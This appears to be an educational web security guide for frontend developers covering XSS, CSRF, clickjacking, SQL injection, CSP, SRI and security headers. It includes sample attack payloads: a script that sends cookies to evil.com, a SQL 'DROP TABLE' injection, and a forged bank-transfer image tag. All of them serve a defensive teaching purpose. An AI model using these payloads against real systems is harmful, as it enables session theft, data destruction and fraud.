# Web Security Fundamentals

## Table of Contents

1. [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
2. [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
3. [Clickjacking](#clickjacking)
4. [SQL Injection](#sql-injection)
5. [Content Security Policy (CSP)](#content-security-policy-csp)
6. [Subresource Integrity (SRI)](#subresource-integrity-sri)
7. [Open Redirects](#open-redirects)
8. [OWASP Top 10 Overview](#owasp-top-10-overview)
9. [Input Validation vs Sanitization](#input-validation-vs-sanitization)
10. [HTML Sanitization](#html-sanitization)
11. [Security Headers Checklist](#security-headers-checklist)

---

## Cross-Site Scripting (XSS)

XSS is the most common web vulnerability. An attacker injects malicious scripts into
content that other users view, allowing them to steal cookies, session tokens, or
perform actions on behalf of the victim.

### Stored XSS

The malicious script is permanently stored on the target server (e.g., in a database).
When a user loads the page, the script executes.

```
Attacker → Submits comment: <script>steal(document.cookie)</script>
Server   → Stores comment in database
Victim   → Loads page → Browser renders comment → Script executes
```

**Example — vulnerable code:**
```html
<!-- Server renders user comment directly into HTML -->
<div class="comment">${userComment}</div>
<!-- If userComment = "<script>fetch('https://evil.com?c='+document.cookie)</script>" -->
<!-- The script runs in every visitor's browser -->
```

### Reflected XSS

The malicious script is part of the request (e.g., a URL parameter) and is immediately
reflected back in the response without proper encoding.

```
Attacker → Crafts URL: https://example.com/search?q=<script>alert(1)</script>
Attacker → Sends link to victim via email/social media
Victim   → Clicks link → Server reflects query param in page → Script executes
```

**Example — vulnerable search page:**
```html
<!-- Server renders: -->
<p>You searched for: ${req.query.q}</p>
<!-- If q = <img src=x onerror=alert(1)>, the script runs -->
```

### DOM-Based XSS

The vulnerability is entirely in client-side code. The server never sees the payload;
JavaScript reads from a source (e.g., `location.hash`) and writes to a sink
(e.g., `innerHTML`).

```
Attacker → Crafts URL: https://example.com/page#<img src=x onerror=alert(1)>
Victim   → Clicks link → Client JS reads hash → Writes to innerHTML → Script executes
```

**Example — vulnerable client code:**
```javascript
// VULNERABLE — DOM-based XSS
document.getElementById('output').innerHTML = location.hash.substring(1);
```

### XSS Prevention

| Technique | What It Does | When to Use |
|-----------|-------------|-------------|
| **Output encoding** | Converts `<` → `&lt;`, `>` → `&gt;`, etc. | Always — when inserting user data into HTML |
| **CSP** | Restricts which scripts can execute | Always — defense in depth |
| **Sanitization** | Strips dangerous tags/attributes from HTML | When you must allow some HTML (rich text) |
| **DOMPurify** | Library that sanitizes HTML safely | Client-side HTML sanitization |

**Output encoding by context:**

```
HTML body:    & → &amp;  < → &lt;  > → &gt;  " → &quot;  ' → &#x27;
HTML attr:    Same as above, always quote attributes
JavaScript:   Encode as JSON string (JSON.stringify)
URL param:    encodeURIComponent()
CSS:          Avoid inserting user data into CSS entirely
```

**Key principle:** Encode output, not input. Store data as-is, encode when rendering.

---

## Cross-Site Request Forgery (CSRF)

CSRF tricks an authenticated user's browser into making an unwanted request to a
site where they're logged in.

### How CSRF Works

```
1. User logs into bank.com → receives session cookie
2. User visits evil.com (in another tab)
3. evil.com contains: <img src="https://bank.com/transfer?to=attacker&amount=10000">
4. Browser automatically sends bank.com cookies with the request
5. bank.com processes the transfer because the session cookie is valid
```

The attack works because browsers automatically attach cookies to requests,
regardless of which site initiated the request.

### CSRF Prevention

**1. CSRF Tokens (Synchronizer Token Pattern)**

```
Server → Generates random token → Stores in session
Server → Embeds token in form as hidden field
Client → Submits form with token
Server → Validates token matches session → Processes request
```

The attacker cannot read the token from another origin (Same-Origin Policy),
so they cannot forge a valid request.

**2. SameSite Cookies**

```
Set-Cookie: session=abc123; SameSite=Strict
```

| Value | Behavior |
|-------|----------|
| `Strict` | Cookie never sent on cross-site requests |
| `Lax` | Cookie sent on top-level navigations (GET only) |
| `None` | Cookie always sent (requires `Secure` flag) |

`Lax` is the default in modern browsers and prevents most CSRF attacks.

**3. Checking Origin/Referer Headers**

```
Server receives request:
  Origin: https://evil.com        ← REJECT (doesn't match our domain)
  Origin: https://bank.com        ← ACCEPT
  Referer: https://evil.com/page  ← REJECT
```

Not 100% reliable (headers can be stripped), but useful as defense in depth.

---

## Clickjacking

Clickjacking tricks users into clicking on something different from what they perceive.
The attacker embeds the target site in a transparent iframe overlaid on a decoy page.

```
Attacker's page (visible):          Target site (invisible iframe):
┌─────────────────────┐              ┌─────────────────────┐
│                     │              │                     │
│  "Click to win a    │     over     │  [Delete Account]   │
│   free iPhone!"     │   ───────►   │                     │
│                     │              │                     │
└─────────────────────┘              └─────────────────────┘
User clicks "free iPhone" → actually clicks "Delete Account" on target site
```

### Prevention

**X-Frame-Options header:**
```
X-Frame-Options: DENY              # Cannot be framed at all
X-Frame-Options: SAMEORIGIN        # Only same-origin framing allowed
```

**CSP frame-ancestors (modern replacement):**
```
Content-Security-Policy: frame-ancestors 'none';         # Same as DENY
Content-Security-Policy: frame-ancestors 'self';          # Same as SAMEORIGIN
Content-Security-Policy: frame-ancestors https://trusted.com;
```

---

## SQL Injection

SQL injection occurs when user input is concatenated directly into SQL queries.

```javascript
// VULNERABLE
const query = `SELECT * FROM users WHERE name = '${userInput}'`;
// If userInput = "' OR '1'='1" → returns all users
// If userInput = "'; DROP TABLE users; --" → deletes the table
```

### Prevention

**Parameterized queries (prepared statements):**
```javascript
// SAFE — the database treats the parameter as data, never as SQL
const query = 'SELECT * FROM users WHERE name = ?';
db.execute(query, [userInput]);
```

**ORMs (Object-Relational Mappers):**
```javascript
// SAFE — ORMs parameterize automatically
const user = await User.findOne({ where: { name: userInput } });
```

**Key rule:** Never concatenate user input into queries. Always use parameterized
queries or an ORM.

---

## Content Security Policy (CSP)

CSP is an HTTP header that tells the browser which sources of content are allowed.
It's the strongest defense against XSS.

### Key Directives

| Directive | Controls | Example |
|-----------|----------|---------|
| `default-src` | Fallback for all resource types | `'self'` |
| `script-src` | JavaScript sources | `'self' https://cdn.example.com` |
| `style-src` | CSS sources | `'self' 'unsafe-inline'` |
| `img-src` | Image sources | `'self' data: https:` |
| `connect-src` | XHR, fetch, WebSocket | `'self' https://api.example.com` |
| `font-src` | Web font sources | `'self' https://fonts.googleapis.com` |
| `frame-src` | iframe sources | `'none'` |
| `frame-ancestors` | Who can frame this page | `'none'` |
| `report-uri` | Where to send violation reports | `/csp-report` |

### Nonce-Based CSP

Instead of allowing all inline scripts, allow only scripts with a specific nonce:

```
Content-Security-Policy: script-src 'nonce-abc123Random'
```

```html
<script nonce="abc123Random">/* This runs */</script>
<script>/* This is blocked */</script>
<script nonce="wrong">/* This is blocked */</script>
```

The nonce must be random and unique per response. Never hardcode it.

### Hash-Based CSP

Allow specific inline scripts by their hash:

```
Content-Security-Policy: script-src 'sha256-base64EncodedHash'
```

The browser computes the hash of each inline script and checks it against the policy.

### Example CSP for a Typical SPA

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  font-src 'self' https://fonts.gstatic.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  report-uri /csp-violations;
```

---

## Subresource Integrity (SRI)

SRI ensures that files fetched from CDNs haven't been tampered with. The browser
checks the downloaded file's hash against the expected hash.

```html
<script
  src="https://cdn.example.com/lib.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8w"
  crossorigin="anonymous"
></script>
```

If the file's hash doesn't match, the browser refuses to execute it.

**Generating SRI hashes:**
```bash
cat lib.js | openssl dgst -sha384 -binary | openssl base64 -A
# Or use: shasum -b -a 384 lib.js | awk '{ print $1 }' | xxd -r -p | base64
```

**How it works:**
```
Browser downloads file from CDN
Browser computes SHA-384 hash of file content
Browser compares hash to integrity attribute
  Match    → Execute/apply the resource
  Mismatch → Block the resource, report error
```

---

## Open Redirects

An open redirect occurs when a site redirects users to an attacker-controlled URL
based on user input.

```
https://example.com/login?redirect=https://evil.com
```

After login, the user is redirected to `evil.com`, which could be a phishing page
that looks identical to `example.com`.

### Prevention

- **Whitelist allowed redirect URLs** — only redirect to known-good paths
- **Use relative paths only** — reject any URL with a scheme or different host
- **Validate against a list of allowed domains**

```javascript
// SAFE — only allow relative paths
function safeRedirect(url: string): string {
  const parsed = new URL(url, 'https://example.com');
  if (parsed.origin !== 'https://example.com') {
    return '/'; // Default to home
  }
  return parsed.pathname;
}
```

---

## OWASP Top 10 Overview

The OWASP Top 10 (2021) lists the most critical web application security risks:

| # | Category | Description |
|---|----------|-------------|
| A01 | **Broken Access Control** | Users accessing unauthorized functions/data |
| A02 | **Cryptographic Failures** | Weak crypto, sensitive data exposure |
| A03 | **Injection** | SQL, XSS, command injection |
| A04 | **Insecure Design** | Missing security controls in architecture |
| A05 | **Security Misconfiguration** | Default configs, unnecessary features |
| A06 | **Vulnerable Components** | Using libraries with known vulnerabilities |
| A07 | **Auth Failures** | Broken authentication, session management |
| A08 | **Software/Data Integrity Failures** | Unverified updates, CI/CD issues |
| A09 | **Logging/Monitoring Failures** | Missing audit trails, no alerting |
| A10 | **SSRF** | Server-Side Request Forgery |

For frontend developers, the most relevant are: A01 (access control on the client
is never sufficient — always enforce on the server), A03 (XSS), A05 (security headers),
A07 (auth), and A08 (SRI).

---

## Input Validation vs Sanitization

These are different things. Use both.

| Concept | Purpose | When | Example |
|---------|---------|------|---------|
| **Validation** | Reject bad input | Before processing | Email must match regex |
| **Sanitization** | Clean dangerous content | Before rendering | Strip `<script>` tags |

**Validation** says "is this input acceptable?" and rejects if not.
**Sanitization** says "make this input safe" by removing or encoding dangerous parts.

```
Input: "<script>alert(1)</script>Hello"

Validation:  REJECT — contains HTML tags (if not expected)
Sanitization: "Hello" — strip the dangerous parts, keep the rest
```

**Key principle for frontend:**
- Validate on the client for UX (fast feedback)
- Validate on the server for security (client validation can be bypassed)
- Sanitize when rendering user-generated content

---

## HTML Sanitization

When you must allow users to input rich text (markdown, WYSIWYG editors), you need
to sanitize the HTML to remove dangerous elements while preserving safe formatting.

### DOMPurify (Client-Side)

The gold standard for client-side HTML sanitization:

```javascript
import DOMPurify from 'dompurify';

const dirty = '<p>Hello</p><script>alert(1)</script><img src=x onerror=alert(1)>';
const clean = DOMPurify.sanitize(dirty);
// clean = '<p>Hello</p><img src="x">'
// Script tags and event handlers are removed
```

**Configuration:**
```javascript
DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li'],
  ALLOWED_ATTR: ['href', 'title'],
  ALLOW_DATA_ATTR: false,
});
```

### sanitize-html (Server-Side / Node.js)

```javascript
import sanitizeHtml from 'sanitize-html';

const clean = sanitizeHtml(dirty, {
  allowedTags: ['p', 'b', 'i', 'em', 'strong', 'a'],
  allowedAttributes: { 'a': ['href'] },
});
```

### Rules for Safe HTML Rendering

1. **Never use `innerHTML` with unsanitized content**
2. **Use `textContent` when you don't need HTML** — it's always safe
3. **If you must use `innerHTML`, sanitize with DOMPurify first**
4. **Use a framework's built-in escaping** (React's JSX escapes by default)
5. **Be careful with `dangerouslySetInnerHTML`** — sanitize first

---

## Security Headers Checklist

Every web application should set these response headers:

### X-Content-Type-Options

```
X-Content-Type-Options: nosniff
```

Prevents browsers from MIME-sniffing a response away from the declared Content-Type.
Without this, a browser might interpret a text file as JavaScript.

### X-Frame-Options

```
X-Frame-Options: DENY
```

Prevents the page from being embedded in an iframe. Use `SAMEORIGIN` if you need
to allow framing by your own site. Superseded by CSP `frame-ancestors` but still
set it for older browsers.

### Strict-Transport-Security (HSTS)

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

Forces browsers to always use HTTPS for this domain. After first visit, the browser
will never make an HTTP request to this domain. `preload` submits the domain to the
HSTS preload list built into browsers.

### Permissions-Policy

```
Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
```

Controls which browser features and APIs the page can use. `()` means disabled.
Previously called Feature-Policy.

### Referrer-Policy

```
Referrer-Policy: strict-origin-when-cross-origin
```

Controls how much referrer information is sent with requests.

### Complete Headers Example

```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Permissions-Policy: camera=(), microphone=(), geolocation=()
Referrer-Policy: strict-origin-when-cross-origin
X-DNS-Prefetch-Control: off
```

---

## Key Takeaways for Frontend Developers

1. **XSS is your #1 threat** — encode output, use CSP, sanitize HTML
2. **CSRF is mitigated by SameSite cookies** — but use tokens for critical actions
3. **Security headers are cheap and effective** — set them all
4. **Client-side validation is UX, not security** — always validate on the server
5. **Never trust user input** — validate, sanitize, encode
6. **Use HTTPS everywhere** — no exceptions
7. **Keep dependencies updated** — `npm audit` regularly
8. **CSP is your best friend** — start strict, loosen as needed
9. **SRI for CDN resources** — verify integrity of third-party scripts
10. **Defense in depth** — no single control is sufficient

---

## Further Reading

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)
- [Content Security Policy Reference](https://content-security-policy.com/)
- [DOMPurify](https://github.com/cure53/DOMPurify)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html)
